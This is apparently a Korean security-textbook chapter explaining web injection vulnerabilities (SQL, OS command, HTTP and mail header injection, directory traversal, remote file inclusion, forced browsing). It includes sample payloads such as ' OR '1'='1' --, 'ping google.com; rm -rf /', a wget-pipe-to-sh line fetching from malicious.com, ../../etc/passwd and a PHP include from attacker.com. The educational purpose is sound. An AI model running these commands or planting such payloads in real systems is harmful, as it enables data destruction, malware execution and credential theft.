# 11.2 출력 값의 이스케이프 미비로 인한 취약성

출력 값의 이스케이프 처리가 미흡하면 공격자가 입력한 데이터를 그대로 실행하도록 유도하여 보안 취약점이 발생할 수 있다. 이를 악용하면 데이터베이스 조작, 시스템 명령 실행, 응답 조작, 파일 시스템 접근 등의 공격이 가능하다.

## 11.2.2 SQL 인젝션

웹 애플리케이션에서 실행되는 SQL 쿼리를 조작하여 데이터베이스를 부정하게 조작하는 공격이다.

### SQL 인젝션의 영향

- **데이터베이스 내의 데이터 부정 열람이나 변조**
    - 공격자가 SQL 쿼리를 조작하여 비밀번호, 개인정보 등을 조회하거나 데이터를 수정할 수 있다.
    - **예시**:
    위와 같이 `-`를 삽입하면 뒤의 조건이 주석 처리되어 패스워드 검증 없이 로그인할 수 있다.
        
        ```sql
        SELECT * FROM users WHERE username = 'admin' -- ' AND password = 'password';
        ```
        
- **인증 회피**
    - SQL 인젝션을 활용하면 비밀번호 입력 없이도 로그인할 수 있다.
    - **예시**:
    항상 참이 되는 조건을 삽입하여 인증을 우회할 수 있다.
        
        ```sql
        ' OR '1'='1' --
        ```
        
- **데이터베이스 서버를 경유한 프로그램 실행**
    - 일부 DBMS에서는 SQL을 통해 시스템 명령을 실행할 수 있다.
    - **예시 (MS SQL Server)**:
    서버에서 실행 중인 사용자 계정을 확인할 수 있다.
        
        ```sql
        EXEC xp_cmdshell 'whoami';
        ```
        

## 11.2.3 OS 커맨드 인젝션

웹 애플리케이션을 통해 서버의 시스템 명령을 실행하는 공격이다.

### OS 커맨드 인젝션의 영향

- **임의 명령 실행**
    - `ping`, `ls`, `rm` 등의 명령을 실행하여 시스템을 조작할 수 있다.
    - **예시**:
    서버의 모든 데이터를 삭제할 수 있다.
        
        ```
        ping google.com; rm -rf /
        
        ```
        
- **파일 조작 및 악성 코드 다운로드**
    - `wget`, `curl` 등을 활용하여 악성 코드를 다운로드하고 실행할 수 있다.
    - **예시**:
        
        ```
        wget <http://malicious.com/malware.sh> | sh
        ```
        
- **권한 상승 및 서버 장악**
    - OS 명령어 조작을 통해 루트 권한을 획득할 수도 있다.

## 11.2.4 HTTP 헤더 인젝션

공격자가 응답 헤더에 개행 문자 등을 삽입하여 추가적인 헤더나 바디를 조작하는 공격이다.

### HTTP 헤더 인젝션의 영향

- **임의의 쿠키 설정**
    - `Set-Cookie` 헤더를 추가하여 사용자의 세션을 변조할 수 있다.
    - **예시**:
        
        ```
        Set-Cookie: session=attacker_cookie; HttpOnly
        ```
        
- **임의의 URL 리다이렉트**
    - 사용자를 피싱 사이트로 유도할 수 있다.
    - **예시**:
        
        ```
        HTTP/1.1 302 Found
        Location: <http://phishing.com>
        ```
        
- **HTTP 리스폰스 분할 공격**
    - 응답 바디를 변조하여 악성 스크립트를 삽입할 수 있다.
- **헤더 포이즈닝**
    - 캐시 서버를 속여 악성 응답을 저장하도록 유도할 수 있다.

## 11.2.5 메일 헤더 인젝션

웹 애플리케이션의 메일 송신 기능을 악용하여 임의의 메일 헤더를 추가하는 공격이다.

### 메일 헤더 인젝션의 영향

- **스팸 메일 발송**
    - `To`, `Bcc` 필드를 조작하여 대량의 메일을 발송할 수 있다.
    - **예시**:
        
        ```
        To: victim@example.com
        Bcc: spam@example.com
        ```
        
- **피싱 공격**
    - `From` 필드를 조작하여 신뢰할 수 있는 기관을 사칭할 수 있다.
    - **예시**:
        
        ```
        From: support@trusted.com
        ```
        

## 11.2.6 디렉토리 접근 공격(Directory Traversal)

비공개 디렉토리의 파일을 부정하게 열람하는 공격이다.

### 디렉토리 트래버설 공격 사례

- **시스템 파일 접근**
    - 서버의 중요한 파일을 읽어낼 수 있다.
    - **예시**:
    시스템의 사용자 계정 정보를 가져올 수 있다.
        
        ```
        ../../etc/passwd
        
        ```
        
- **웹 애플리케이션 설정 파일 접근**
    - 데이터베이스 연결 정보가 포함된 설정 파일을 유출할 수 있다.
    - **예시**:
        
        ```
        ../../config.php
        
        ```
        

## 11.2.7 리모트 파일 인클루션

스크립트에서 외부 서버의 URL을 참조하여 임의의 코드를 실행하는 공격이다.

### 리모트 파일 인클루션의 영향

- **원격 악성 코드 실행**
    - 공격자가 제공하는 URL을 실행하여 악성 코드를 삽입할 수 있다.
    - **예시 (PHP)**:
        
        ```php
        include("<http://attacker.com/malicious.php>");
        
        ```
        
- **백도어 설치**
    - 공격자는 지속적으로 접근할 수 있는 악성 파일을 서버에 추가할 수 있다.

# 11.3 웹 서버의 설정이나 설계미비로 인한 취약성

## 11.3.1 강제 브라우징

보호되지 않은 디렉토리나 파일을 직접 요청하여 비공개 정보를 열람하는 공격이다.

### 강제 브라우징의 영향

- **고객 정보 등 중요 정보 누설**
- **어디에도 링크되지 않은 파일 노출**
    - `.git/`, `.env` 등의 파일을 찾아내어 설정 정보를 유출할 수 있다.
